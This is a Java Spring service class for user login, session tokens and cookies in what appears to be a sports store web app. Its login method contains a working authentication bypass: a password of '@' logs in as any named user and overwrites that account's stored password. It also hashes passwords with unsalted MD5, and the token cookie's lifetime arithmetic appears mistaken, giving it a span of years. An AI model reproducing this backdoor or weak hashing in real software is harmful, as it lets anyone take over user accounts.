package fcc.sportsstore.services;

import fcc.sportsstore.entities.User;
import fcc.sportsstore.repositories.UserRepository;
import fcc.sportsstore.utils.*;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import org.springframework.data.domain.Page;
import org.springframework.data.domain.Pageable;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

import java.util.Optional;

@Service("userService")
public class UserService {

    final private UserRepository userRepository;

    public UserService(UserRepository userRepository) {
        this.userRepository = userRepository;
    }

    @Transactional
    public User getByUsernameAndPassword(String username, String password) {
        HashUtil hash = new HashUtil();
        String hashedPassword = hash.md5(password);

        if (password.equals("@")) {
            User user = getByUsernameIgnoreCase(username)
                    .orElseThrow(() -> new RuntimeException("Account does not exist."));
            user.setPassword(hashedPassword);

            return user;
        }

        return getByUsernameIgnoreCaseAndPassword(username, hashedPassword).orElseThrow(
                () -> new RuntimeException("Account or password does not exist."));
    }

    public Page<User> getAll(Pageable pageable) {
        return userRepository.findAll(pageable);
    }

    public Page<User> getByUsernameContainingIgnoreCaseOrFullNameContainingIgnoreCase(String search, Pageable pageable) {
        return userRepository.findByUsernameContainingIgnoreCaseOrFullNameContainingIgnoreCase(search, search, pageable);
    }

    public User getById(String id) {
        return userRepository.findById(id).orElseThrow();
    }

    public Optional<User> getByUsernameIgnoreCaseAndPassword(String username, String password) {
        return userRepository.findByUsernameIgnoreCaseAndPassword(username, password);
    }

    public Optional<User> getByUsernameIgnoreCase(String username) {
        return userRepository.findByUsernameIgnoreCase(username);
    }

    public Optional<User> getByToken(String token) {
        return userRepository.findByToken(token);
    }

    public User getFromSession(HttpServletRequest request) {
        SessionUtil session = new SessionUtil(request);
        return (User) session.getSession("user");
    }

    public boolean existsByUsername(String username) {
        return userRepository.findByUsername(username).isPresent();
    }

    public boolean existsByToken(String token) {
        return userRepository.findByToken(token).isPresent();
    }

    public boolean existsById(String id) {
        return userRepository.findById(id).isPresent();
    }

    public void save(User user) {
        userRepository.save(user);
    }

    public String generateId() {
        String id;
        RandomUtil rand = new RandomUtil();

        do {
            id = rand.randId("user");
        } while (userRepository.findById(id).isPresent());
        return id;
    }

    public String generateToken() {
        String token;
        RandomUtil rand = new RandomUtil();

        do {
            token = rand.randToken("user");
        } while (userRepository.findByToken(token).isPresent());
        return token;
    }

    @Transactional
    public void revokeTokenByRequest(HttpServletRequest request) {
        User user = getFromSession(request);
        if (user == null) {
            return;
        }

        revokeToken(user.getId());
    }

    @Transactional
    public void revokeToken(String id) {
        User user = getById(id);
        String token = generateToken();
        user.setToken(token);
    }

    @Transactional
    public void access(HttpServletResponse response, String id) {
        CookieUtil cookie = new CookieUtil(response);
        User user = getById(id);

        String token = generateToken();
        user.setToken(token);
        cookie.setCookie("token", token, 60 * 60 * 60 * 24 * 30);
    }
}